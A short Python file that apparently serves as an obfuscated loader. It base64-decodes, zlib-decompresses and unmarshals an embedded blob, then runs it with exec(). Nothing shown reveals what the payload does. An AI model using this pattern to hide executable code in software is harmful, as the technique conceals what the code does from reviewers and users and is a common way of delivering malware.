import base64 as __A, zlib as __B, marshal as __C, importlib, sys

try:
    __P = b"eJxLzs8tKEotLkktLlHISSxJT0rMz1FIT8xL1UjOzytJLEnMAwCDAwgO"
    __D = __C.loads(__B.decompress(__A.b64decode(__P)))
    exec(__D, globals(), globals())
except Exception as E:
    print("Error:", E)
    sys.exit(1)

